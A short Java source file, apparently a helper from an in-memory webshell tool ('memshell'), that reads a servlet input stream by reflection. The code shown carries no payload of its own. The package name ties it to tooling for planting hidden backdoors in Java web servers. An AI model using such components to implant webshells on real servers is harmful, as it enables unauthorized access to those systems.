package net.rebeyond.memshell.redefine;

public class MyServletInputStream {
	public static void read(Object servletInputStream ,byte[] a,int b,int c) throws Exception
	{
		servletInputStream.getClass().getMethod("read", byte[].class,int.class,int.class).invoke(servletInputStream, a,b,c);
	}
	
}
